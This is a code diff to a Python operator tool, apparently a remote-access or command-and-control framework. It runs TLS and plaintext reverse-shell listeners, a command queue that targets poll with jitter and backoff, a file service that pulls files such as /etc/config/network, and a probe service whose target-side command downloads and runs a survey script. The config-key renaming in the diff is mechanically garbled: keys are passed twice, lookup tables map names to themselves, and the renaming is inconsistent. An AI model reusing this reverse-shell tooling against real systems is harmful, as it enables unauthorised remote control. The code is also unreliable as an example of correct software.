@@ -13099,8 +13099,8 @@ def serve_command_queue(cfg, timeout, max_sessions=0):
 
 def serve_file_service(cfg, timeout, max_sessions=0):
     service = "file-service"
-    port = int(cfg["file_service_port"])
-    use_tls = yes(cfg.get("file_service_tls", "yes"))
+    port = int(cfg["GRIT_OPERATOR_FILE_SERVICE_PORT"])
+    use_tls = yes(cfg.get("GRIT_OPERATOR_FILE_SERVICE_TLS", "yes"))
     cert = Path(str(cfg["tls_cert"]))
     key = Path(str(cfg["tls_key"]))
     context = None
@@ -13157,7 +13157,7 @@ def serve_file_service(cfg, timeout, max_sessions=0):
                         metadata, status_code = handle_file_service_http(cfg, conn, files_dir, addr)
                         if metadata.get("operation") == "upload" and "route_kind" not in metadata:
                             host = (local_ips() or ["OPERATOR_IP"])[0]
-                            route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("file_service_port", 22204))
+                            route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 22204))
                             metadata = attach_target_route_fields(metadata, route)
                         target_rec = record_target_activity(cfg, metadata, service, session_id=log_dir.name)
                         if metadata.get("operation") == "fetch":
@@ -13241,7 +13241,7 @@ def serve_tls_shell(cfg, timeout, use_stdin=True, max_sessions=0, script_bytes=N
             print(f"Manual: openssl req -x509 -newkey rsa:2048 -keyout {key} -out {cert} -days 3650 -nodes -subj /CN=grit", file=sys.stderr)
             return 2
         print(f"Generated TLS cert/key: {cert}", file=sys.stderr)
-    port = int(cfg["shell_listen_port"])
+    port = int(cfg["GRIT_RSHELL_SOCAT_PORT"])
     log_dir = session_log_dir(cfg, "tls-shell")
     policy = rshell_session_policy_record(cfg)
     target_ctx = selected_target_context(cfg)
@@ -13337,7 +13337,7 @@ def serve_plain_shell(cfg, timeout, use_stdin=True, max_sessions=0, script_bytes
                       expect=None, session_timeout=None):
     """Plaintext shell listener — debug/insecure; socat+none or builtin+none."""
     service = "plain-shell"
-    port = int(cfg["shell_listen_port"])
+    port = int(cfg["GRIT_RSHELL_SOCAT_PORT"])
     print("WARNING: plain-shell is INSECURE and for debug use only!", file=sys.stderr)
     log_dir = session_log_dir(cfg, "plain-shell")
     policy = rshell_session_policy_record(cfg)
@@ -13625,7 +13625,7 @@ def serve_bridge(cfg, timeout, max_sessions=0, session_timeout=0):
 
 
 def probe_script_fn(cfg, host, port):
-    name = str(cfg.get("probe_name", "survey.sh")).lstrip("/") or "survey.sh"
+    name = str(cfg.get("GRIT_PROBE_NAME", "survey.sh")).lstrip("/") or "survey.sh"
     url = f"http://{host}:{port}/probe/result"
     return f"""#!/bin/sh
 bb_sanitize() {{
@@ -13699,7 +13699,7 @@ def handle_probe_http(cfg, conn, method, target, headers, body, addr, script_tex
     parsed = urllib.parse.urlparse(target)
     remote = f"{addr[0]}:{addr[1]}"
     route_doc = dict(route or probe_route_context(cfg))
-    script_name = "/" + (str(cfg.get("probe_name", "survey.sh")).lstrip("/") or "survey.sh")
+    script_name = "/" + (str(cfg.get("GRIT_PROBE_NAME", "survey.sh")).lstrip("/") or "survey.sh")
     if method in {"GET", "HEAD"} and parsed.path in {script_name, "/survey.sh", "/probe/probe.sh"}:
         payload = script_text.encode("utf-8")
         send_http_response(conn, 200, b"" if method == "HEAD" else payload, "text/x-shellscript", headers={
@@ -13746,11 +13746,11 @@ def handle_probe_http(cfg, conn, method, target, headers, body, addr, script_tex
 
 def serve_probe(cfg, timeout, max_sessions=0):
     service = "probe"
-    port = int(cfg.get("probe_port", 22207))
-    host = str(cfg.get("operator_server_host") or cfg.get("listen_host") or "127.0.0.1")
+    port = int(cfg.get("GRIT_PROBE_PORT", 22207))
+    host = str(cfg.get("GRIT_OPERATOR_SERVER_HOST") or cfg.get("listen_host") or "127.0.0.1")
     if host in ("0.0.0.0", "::"):
         host = "127.0.0.1"
-    script_name = str(cfg.get("probe_name", "survey.sh")).lstrip("/") or "survey.sh"
+    script_name = str(cfg.get("GRIT_PROBE_NAME", "survey.sh")).lstrip("/") or "survey.sh"
     route = probe_route_context(cfg, host=host, port=port)
     route_host = str(route.get("host") or host)
     route_port = int(route.get("port") or port)
@@ -13852,15 +13852,15 @@ def service_port(cfg, service):
     if service == "ssh":
         return int(cfg.get("ssh_listen_port", 22202))
     if service in {"tls-shell", "plain-shell"}:
-        return int(cfg.get("shell_listen_port", 22203))
+        return int(cfg.get("GRIT_RSHELL_SOCAT_PORT", 22203))
     if service == "file-service":
-        return int(cfg.get("file_service_port", 22204))
+        return int(cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 22204))
     if service == "command-queue":
-        return int(cfg.get("command_queue_port", 22205))
+        return int(cfg.get("GRIT_COMMAND_QUEUE_PORT", 22205))
     if service == "bridge":
         return int(cfg.get("bridge_listen_port", 22206))
     if service == "probe":
-        return int(cfg.get("probe_port", 22207))
+        return int(cfg.get("GRIT_PROBE_PORT", 22207))
     return 0
 
 
@@ -13874,9 +13874,9 @@ def configured_daemon_services(cfg, explicit=None):
             raise ValueError(f"unsupported daemon service: {service}")
         services.append(service)
     if not services:
-        if yes(cfg.get("file_service_enable", "no")):
+        if yes(cfg.get("GRIT_OPERATOR_FILE_SERVICE_ENABLE", "no")):
             services.append("file-service")
-        if yes(cfg.get("command_queue_enable", "no")):
+        if yes(cfg.get("GRIT_COMMAND_QUEUE_ENABLE", "no")):
             services.append("command-queue")
         if yes(cfg.get("bridge_enable", "no")):
             services.append("bridge")
@@ -13897,22 +13897,22 @@ def daemon_child_command(cfg, service):
     command.extend(["--targets-file", str(targets_path(cfg))])
     command.extend(["--listen-host", str(cfg.get("listen_host", "0.0.0.0"))])
     if service in ("tls-shell", "plain-shell"):
-        command.extend(["--shell-port", str(cfg.get("shell_listen_port", 22203))])
+        command.extend(["--shell-port", str(cfg.get("GRIT_RSHELL_SOCAT_PORT", 22203))])
     if service == "ssh":
         command.extend(["--ssh-port", str(cfg.get("ssh_listen_port", 22202))])
-        command.extend(["--forward-port", str(cfg.get("forward_port", 2200))])
+        command.extend(["--forward-port", str(cfg.get("GRIT_OPERATOR_REMOTE_FORWARD_PORT", 2200))])
     if service == "file-service":
-        command.extend(["--file-port", str(cfg.get("file_service_port", 22204))])
-        command.extend(["--file-service-tls", str(cfg.get("file_service_tls", "yes"))])
+        command.extend(["--file-port", str(cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 22204))])
+        command.extend(["--file-service-tls", str(cfg.get("GRIT_OPERATOR_FILE_SERVICE_TLS", "yes"))])
     if service == "command-queue":
-        command.extend(["--command-queue-port", str(cfg.get("command_queue_port", 22205))])
+        command.extend(["--command-queue-port", str(cfg.get("GRIT_COMMAND_QUEUE_PORT", 22205))])
     if service == "bridge":
         command.extend(["--bridge-port", str(cfg.get("bridge_listen_port", 22206))])
         command.extend(["--bridge-dest-host", str(cfg.get("bridge_dest_host", "127.0.0.1"))])
         command.extend(["--bridge-dest-port", str(cfg.get("bridge_dest_port", 0))])
     if service == "probe":
-        command.extend(["--probe-port", str(cfg.get("probe_port", 22207))])
-        command.extend(["--probe-name", str(cfg.get("probe_name", "survey.sh"))])
+        command.extend(["--probe-port", str(cfg.get("GRIT_PROBE_PORT", 22207))])
+        command.extend(["--probe-name", str(cfg.get("GRIT_PROBE_NAME", "survey.sh"))])
     command.extend(["--transport", service])
     command.extend(["--managed-by", "operator-daemon"])
     return command
@@ -14177,9 +14177,9 @@ def service_tls_enabled(cfg, service):
     if service == "tls-shell":
         return True
     if service == "file-service":
-        return yes(str(cfg.get("file_service_tls", "yes")))
+        return yes(str(cfg.get("GRIT_OPERATOR_FILE_SERVICE_TLS", "yes")))
     if service == "command-queue":
-        return yes(str(cfg.get("command_queue_tls", "yes")))
+        return yes(str(cfg.get("GRIT_COMMAND_QUEUE_TLS", "yes")))
     return False
 
 
@@ -16263,7 +16263,7 @@ def status_document(cfg):
         "target_command_session_policy_valid_counts": target_command_summary.get("by_session_policy_valid") or {},
         "target_command_session_policy_error_count": target_command_summary.get("session_policy_error_count", 0),
         "rshell_session_policy_record_count": len(rshell_session_policy_records),
-        "rshell_session_policy": rshell_session_policy_record_item.get("session_policy", ""),
+        "GRIT_RSHELL_SESSION_POLICY": rshell_session_policy_record_item.get("session_policy", ""),
         "rshell_session_policy_valid": bool(rshell_session_policy_record_item.get("session_policy_valid", False)),
         "rshell_session_policy_error_count": len(rshell_session_policy_record_item.get("session_policy_errors") or []),
         "rshell_session_policy_retry_scope": rshell_session_policy_record_item.get("retry_scope", ""),
@@ -16483,11 +16483,11 @@ def status_document(cfg):
         "command_queue_result_upload_supported": bool(command_queue_policy_summary.get("result_upload_supported", False)),
         "command_queue_poll_transport_supported": bool(command_queue_policy_summary.get("poll_transport_supported", False)),
         "command_queue_live_polling_supported": bool(command_queue_policy_summary.get("live_polling_supported", False)),
-        "command_queue_poll_interval_sec": command_queue_policy_summary.get("poll_interval_sec", "5"),
-        "command_queue_poll_jitter_pct": command_queue_policy_summary.get("poll_jitter_pct", "0"),
-        "command_queue_poll_backoff": command_queue_policy_summary.get("poll_backoff", "none"),
-        "command_queue_poll_max_interval_sec": command_queue_policy_summary.get("poll_max_interval_sec", "300"),
-        "command_queue_max_polls": command_queue_policy_summary.get("max_polls", "0"),
+        "GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC": command_queue_policy_summary.get("poll_interval_sec", "5"),
+        "GRIT_COMMAND_QUEUE_POLL_JITTER_PCT": command_queue_policy_summary.get("poll_jitter_pct", "0"),
+        "GRIT_COMMAND_QUEUE_POLL_BACKOFF": command_queue_policy_summary.get("poll_backoff", "none"),
+        "GRIT_COMMAND_QUEUE_POLL_MAX_INTERVAL_SEC": command_queue_policy_summary.get("poll_max_interval_sec", "300"),
+        "GRIT_COMMAND_QUEUE_MAX_POLLS": command_queue_policy_summary.get("max_polls", "0"),
         "command_queue_arbitrary_policy_requested": bool(command_queue_policy_summary.get("arbitrary_policy_requested", False)),
         "command_queue_arbitrary_execution_allowed": bool(command_queue_policy_summary.get("arbitrary_execution_allowed", False)),
         "command_queue_safe_disabled_default": bool(command_queue_policy_summary.get("safe_disabled_default", False)),
@@ -17960,7 +17960,7 @@ def status_document(cfg):
         "target_attribution": target_attribution,
         "target_attribution_records": target_attribution_records,
         **target_attribution_index_maps,
-        "rshell_session_policy": rshell_session_policy,
+        "GRIT_RSHELL_SESSION_POLICY": rshell_session_policy,
         "rshell_session_policy_records": rshell_session_policy_records,
         **rshell_session_policy_index_maps,
         "api_resources": api_resources,
@@ -19198,12 +19198,12 @@ def rshell_retry_delay_without_jitter(attempt, interval_sec, backoff, max_interv
 
 
 def rshell_session_policy_record(cfg):
-    policy = str(cfg.get("rshell_session_policy") or cfg.get("GRIT_RSHELL_SESSION_POLICY") or "single")
-    retry_count = rshell_cfg_value(cfg, "rshell_retry_count", "GRIT_RSHELL_RETRY_COUNT", "1")
-    retry_interval = rshell_cfg_value(cfg, "rshell_retry_interval_sec", "GRIT_RSHELL_RETRY_INTERVAL_SEC", "5")
-    retry_jitter = rshell_cfg_value(cfg, "rshell_retry_jitter_pct", "GRIT_RSHELL_RETRY_JITTER_PCT", "20")
-    retry_backoff = rshell_cfg_value(cfg, "rshell_retry_backoff", "GRIT_RSHELL_RETRY_BACKOFF", "none")
-    retry_max_interval = rshell_cfg_value(cfg, "rshell_retry_max_interval_sec", "GRIT_RSHELL_RETRY_MAX_INTERVAL_SEC", "300")
+    policy = str(cfg.get("GRIT_RSHELL_SESSION_POLICY") or cfg.get("GRIT_RSHELL_SESSION_POLICY") or "single")
+    retry_count = rshell_cfg_value(cfg, "GRIT_RSHELL_RETRY_COUNT", "GRIT_RSHELL_RETRY_COUNT", "1")
+    retry_interval = rshell_cfg_value(cfg, "GRIT_RSHELL_RETRY_INTERVAL_SEC", "GRIT_RSHELL_RETRY_INTERVAL_SEC", "5")
+    retry_jitter = rshell_cfg_value(cfg, "GRIT_RSHELL_RETRY_JITTER_PCT", "GRIT_RSHELL_RETRY_JITTER_PCT", "20")
+    retry_backoff = rshell_cfg_value(cfg, "GRIT_RSHELL_RETRY_BACKOFF", "GRIT_RSHELL_RETRY_BACKOFF", "none")
+    retry_max_interval = rshell_cfg_value(cfg, "GRIT_RSHELL_RETRY_MAX_INTERVAL_SEC", "GRIT_RSHELL_RETRY_MAX_INTERVAL_SEC", "300")
     valid = policy in ("single", "reconnect", "persistent")
     reconnects = policy in ("reconnect", "persistent")
     post_disconnect_count = "-1" if policy == "persistent" else ("0" if policy == "single" else retry_count)
@@ -19260,8 +19260,8 @@ def rshell_session_policy_record(cfg):
 def generated_target_command_records(cfg, staged=None):
     staged = staged if staged is not None else load_staged(cfg).get("staged", {})
     host = (local_ips() or ["OPERATOR_IP"])[0]
-    file_route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("file_service_port", 22204))
-    survey_route = probe_route_context(cfg, host=host, port=cfg.get("probe_port", 22207))
+    file_route = target_route_context(cfg, "file-service", direct_host=host, direct_port=cfg.get("GRIT_OPERATOR_FILE_SERVICE_PORT", 22204))
+    survey_route = probe_route_context(cfg, host=host, port=cfg.get("GRIT_PROBE_PORT", 22207))
     records = [
         attach_target_route_fields({
             "command": render_file_service_command(["put", "/etc/config/network"], cfg, host=host),
@@ -19318,7 +19318,7 @@ def generated_target_command_records(cfg, staged=None):
             "executes_operator_supplied_commands": False,
         }, file_route),
         attach_target_route_fields({
-            "command": render_probe_command(cfg, host=host, port=cfg.get("probe_port", 22207)),
+            "command": render_probe_command(cfg, host=host, port=cfg.get("GRIT_PROBE_PORT", 22207)),
             "purpose": "download and run the architecture-agnostic probe script",
             "side": "target",
             "service": "probe",
@@ -20112,7 +20112,7 @@ def service_start_headless_command(cfg, service, argv_extra=None):
         str(staged_file_path(cfg)),
     ]
     if service == "file-service":
-        parts.extend(["--file-service-tls", str(cfg.get("file_service_tls", "yes"))])
+        parts.extend(["--file-service-tls", str(cfg.get("GRIT_OPERATOR_FILE_SERVICE_TLS", "yes"))])
     if argv_extra:
         parts.extend(str(item) for item in argv_extra)
     return " ".join(shquote(part) for part in parts)
@@ -20146,7 +20146,7 @@ def start_service_process(cfg, service, argv_extra=None, headless_command=""):
     ]
     cmd.extend(["--state-file", str(state_file_path(cfg)), "--staged-file", str(staged_file_path(cfg))])
     if service == "file-service":
-        cmd.extend(["--file-service-tls", str(cfg.get("file_service_tls", "yes"))])
+        cmd.extend(["--file-service-tls", str(cfg.get("GRIT_OPERATOR_FILE_SERVICE_TLS", "yes"))])
     if argv_extra:
         cmd.extend(argv_extra)
     log_root = Path(str(cfg.get("session_root", "local/sessions")))
@@ -21282,7 +21282,7 @@ def run_target_workflow_action(cfg, selector, command_input="", local_file="", r
         queued = queue_command(scoped, command, metadata={
             "work_kind": "probe",
             "workflow": "probe",
-            "request_name": str(scoped.get("probe_name") or "survey.sh"),
+            "request_name": str(scoped.get("GRIT_PROBE_NAME") or "survey.sh"),
             "route_kind": "bridge" if scoped.get("bridge_profile") else "direct",
             "bridge_profile": str(scoped.get("bridge_profile") or ""),
         })
@@ -22442,45 +22442,45 @@ def run_line_tui(cfg):
     _SERVICE_OPTIONS = {
         "ssh": [
             ("GRIT_OPERATOR_REMOTE_FORWARD_PORT", "forward_port",               "port the target opens for reverse forward"),
-            ("GRIT_OPERATOR_SERVER_HOST",          "operator_server_host",       "operator IP/hostname the target connects to"),
-            ("GRIT_OPERATOR_SERVER_SSH_PORT",      "operator_server_ssh_port",   "operator SSH port"),
-            ("GRIT_OPERATOR_SERVER_USER",          "operator_server_user",       "SSH user on the operator side"),
-            ("GRIT_OPERATOR_KNOWN_HOSTS_POLICY",   "known_hosts_policy",         "how to handle host key verification"),
+            ("GRIT_OPERATOR_SERVER_HOST",          "GRIT_OPERATOR_SERVER_HOST",       "operator IP/hostname the target connects to"),
+            ("GRIT_OPERATOR_SERVER_SSH_PORT",      "GRIT_OPERATOR_SERVER_SSH_PORT",   "operator SSH port"),
+            ("GRIT_OPERATOR_SERVER_USER",          "GRIT_OPERATOR_SERVER_USER",       "SSH user on the operator side"),
+            ("GRIT_OPERATOR_KNOWN_HOSTS_POLICY",   "GRIT_OPERATOR_KNOWN_HOSTS_POLICY",         "how to handle host key verification"),
         ],
         "tls-shell": [
-            ("GRIT_RSHELL_SOCAT_PORT",             "shell_listen_port",          "port to listen on (and target connects to)"),
-            ("GRIT_OPERATOR_SERVER_HOST",          "operator_server_host",       "operator IP/hostname for target-side command"),
+            ("GRIT_RSHELL_SOCAT_PORT",             "GRIT_RSHELL_SOCAT_PORT",          "port to listen on (and target connects to)"),
+            ("GRIT_OPERATOR_SERVER_HOST",          "GRIT_OPERATOR_SERVER_HOST",       "operator IP/hostname for target-side command"),
             ("GRIT_RSHELL_ENCRYPTION",             "encryption",                 "transport encryption: tls / none"),
-            ("GRIT_RSHELL_ALLOW_PLAINTEXT",        "allow_plaintext",            "allow unencrypted fallback"),
+            ("GRIT_RSHELL_ALLOW_PLAINTEXT",        "GRIT_RSHELL_ALLOW_PLAINTEXT",            "allow unencrypted fallback"),
             ("GRIT_RSHELL_TRANSPORT",              "build",                      "active reverse-shell transport"),
-            ("GRIT_RSHELL_SHELL_PROVIDER",         "rshell_shell_provider",      "shell to launch on the target (auto/ash/bash/zsh)"),
+            ("GRIT_RSHELL_SHELL_PROVIDER",         "GRIT_RSHELL_SHELL_PROVIDER",      "shell to launch on the target (auto/ash/bash/zsh)"),
         ],
         "plain-shell": [
-            ("GRIT_RSHELL_SOCAT_PORT",             "shell_listen_port",          "port to listen on"),
-            ("GRIT_OPERATOR_SERVER_HOST",          "operator_server_host",       "operator IP/hostname for target-side command"),
+            ("GRIT_RSHELL_SOCAT_PORT",             "GRIT_RSHELL_SOCAT_PORT",          "port to listen on"),
+            ("GRIT_OPERATOR_SERVER_HOST",          "GRIT_OPERATOR_SERVER_HOST",       "operator IP/hostname for target-side command"),
             ("GRIT_RSHELL_TRANSPORT",              "build",                      "active reverse-shell transport"),
-            ("GRIT_RSHELL_SHELL_PROVIDER",         "rshell_shell_provider",      "shell to launch on the target"),
+            ("GRIT_RSHELL_SHELL_PROVIDER",         "GRIT_RSHELL_SHELL_PROVIDER",      "shell to launch on the target"),
         ],
         "file-service": [
-            ("GRIT_OPERATOR_FILE_SERVICE_PORT",    "file_service_port",          "file service listen port"),
-            ("GRIT_OPERATOR_FILE_SERVICE_TLS",     "file_service_tls",           "TLS for file service connections"),
-            ("GRIT_OPERATOR_FILE_SERVICE_ENABLE",  "file_service_enable",        "enable file service in zero-arg mode"),
-            ("GRIT_OPERATOR_SERVER_HOST",          "operator_server_host",       "operator IP used in staged fetch commands"),
+            ("GRIT_OPERATOR_FILE_SERVICE_PORT",    "GRIT_OPERATOR_FILE_SERVICE_PORT",          "file service listen port"),
+            ("GRIT_OPERATOR_FILE_SERVICE_TLS",     "GRIT_OPERATOR_FILE_SERVICE_TLS",           "TLS for file service connections"),
+            ("GRIT_OPERATOR_FILE_SERVICE_ENABLE",  "GRIT_OPERATOR_FILE_SERVICE_ENABLE",        "enable file service in zero-arg mode"),
+            ("GRIT_OPERATOR_SERVER_HOST",          "GRIT_OPERATOR_SERVER_HOST",       "operator IP used in staged fetch commands"),
         ],
         "command-queue": [
-            ("GRIT_COMMAND_QUEUE_PORT",            "command_queue_port",         "command queue listen port"),
-            ("GRIT_COMMAND_QUEUE_TLS",             "command_queue_tls",          "TLS for command queue connections"),
-            ("GRIT_COMMAND_QUEUE_ENABLE",          "command_queue_enable",       "enable command queue in zero-arg mode"),
-            ("GRIT_COMMAND_QUEUE_REQUIRE_TOKEN",   "command_queue_require_token","require auth token from targets"),
-            ("GRIT_COMMAND_QUEUE_TOKEN",           "command_queue_token",        "shared token (if token required)"),
-            ("GRIT_COMMAND_QUEUE_EXECUTION",       "command_queue_execution",    "command execution mode"),
+            ("GRIT_COMMAND_QUEUE_PORT",            "GRIT_COMMAND_QUEUE_PORT",         "command queue listen port"),
+            ("GRIT_COMMAND_QUEUE_TLS",             "GRIT_COMMAND_QUEUE_TLS",          "TLS for command queue connections"),
+            ("GRIT_COMMAND_QUEUE_ENABLE",          "GRIT_COMMAND_QUEUE_ENABLE",       "enable command queue in zero-arg mode"),
+            ("GRIT_COMMAND_QUEUE_REQUIRE_TOKEN",   "GRIT_COMMAND_QUEUE_REQUIRE_TOKEN","require auth token from targets"),
+            ("GRIT_COMMAND_QUEUE_TOKEN",           "GRIT_COMMAND_QUEUE_TOKEN",        "shared token (if token required)"),
+            ("GRIT_COMMAND_QUEUE_EXECUTION",       "GRIT_COMMAND_QUEUE_EXECUTION",    "command execution mode"),
         ],
         "bridge": [
-            ("GRIT_OPERATOR_TARGET_BIND_HOST",     "operator_target_bind_host",  "bind address for bridge listeners"),
-            ("GRIT_OPERATOR_SERVER_HOST",          "operator_server_host",       "operator IP for generated commands"),
+            ("GRIT_OPERATOR_TARGET_BIND_HOST",     "GRIT_OPERATOR_TARGET_BIND_HOST",  "bind address for bridge listeners"),
+            ("GRIT_OPERATOR_SERVER_HOST",          "GRIT_OPERATOR_SERVER_HOST",       "operator IP for generated commands"),
         ],
         "probe": [
-            ("GRIT_OPERATOR_SERVER_HOST",          "operator_server_host",       "operator IP used in probe command"),
+            ("GRIT_OPERATOR_SERVER_HOST",          "GRIT_OPERATOR_SERVER_HOST",       "operator IP used in probe command"),
         ],
     }
     # Reverse lookup: grit env name → cfg_key (for use in set_line_option)
@@ -24715,8 +24715,8 @@ def run_line_tui(cfg):
         elif start_service and already_listening:
             print("Probe listener already running.")
 
-        port = cfg.get("probe_port", 22207)
-        script_name = cfg.get("probe_name", "probe.sh")
+        port = cfg.get("GRIT_PROBE_PORT", 22207)
+        script_name = cfg.get("GRIT_PROBE_NAME", "probe.sh")
 
         if not already_listening and not started:
             print(f"[!] Probe listener is NOT running on port {port}.")
@@ -24754,8 +24754,8 @@ def run_line_tui(cfg):
             "command_id": queued.get("id", "") if queued else "",
             "started_service": started,
             "already_listening": already_listening,
-            "probe_name": str(script_name),
-            "probe_port": port,
+            "GRIT_PROBE_NAME": str(script_name),
+            "GRIT_PROBE_PORT": port,
         })
         return command
 
@@ -28796,10 +28796,10 @@ def _resolve_transport(cfg, args_transport):
         return t
 
     # Derive from config transport + encryption
-    if yes(cfg.get("file_service_enable", "no")):
+    if yes(cfg.get("GRIT_OPERATOR_FILE_SERVICE_ENABLE", "no")):
         return "file-service"
-    t = cfg.get("transport", "ssh")
-    enc = cfg.get("encryption", "tls")
+    t = cfg.get("GRIT_RSHELL_TRANSPORT", "ssh")
+    enc = cfg.get("GRIT_RSHELL_ENCRYPTION", "tls")
     if t == "ssh":
         return "ssh"
     if enc == "tls":
@@ -29230,13 +29230,13 @@ Aliases accepted: ssh-reverse=ssh, socat-tls=tls-shell, builtin-tls=tls-shell
         cfg["ssh_listen_port"] = args.ssh_port
     shell_port = args.shell_port or args.socat_port
     if shell_port:
-        cfg["shell_listen_port"] = shell_port
+        cfg["GRIT_RSHELL_SOCAT_PORT"] = shell_port
     if args.forward_port:
-        cfg["forward_port"] = args.forward_port
+        cfg["GRIT_OPERATOR_REMOTE_FORWARD_PORT"] = args.forward_port
     if args.file_port:
-        cfg["file_service_port"] = args.file_port
+        cfg["GRIT_OPERATOR_FILE_SERVICE_PORT"] = args.file_port
     if args.command_queue_port:
-        cfg["command_queue_port"] = str(args.command_queue_port)
+        cfg["GRIT_COMMAND_QUEUE_PORT"] = str(args.command_queue_port)
     if args.bridge_port:
         cfg["bridge_listen_port"] = args.bridge_port
     if args.bridge_dest_host:
@@ -29244,11 +29244,11 @@ Aliases accepted: ssh-reverse=ssh, socat-tls=tls-shell, builtin-tls=tls-shell
     if args.bridge_dest_port:
         cfg["bridge_dest_port"] = args.bridge_dest_port
     if args.probe_port:
-        cfg["probe_port"] = args.probe_port
+        cfg["GRIT_PROBE_PORT"] = args.probe_port
     if args.probe_name:
-        cfg["probe_name"] = args.probe_name
+        cfg["GRIT_PROBE_NAME"] = args.probe_name
     if args.file_service_tls:
-        cfg["file_service_tls"] = args.file_service_tls
+        cfg["GRIT_OPERATOR_FILE_SERVICE_TLS"] = args.file_service_tls
     if args.state_file:
         cfg["server_state"] = args.state_file
     if args.staged_file:
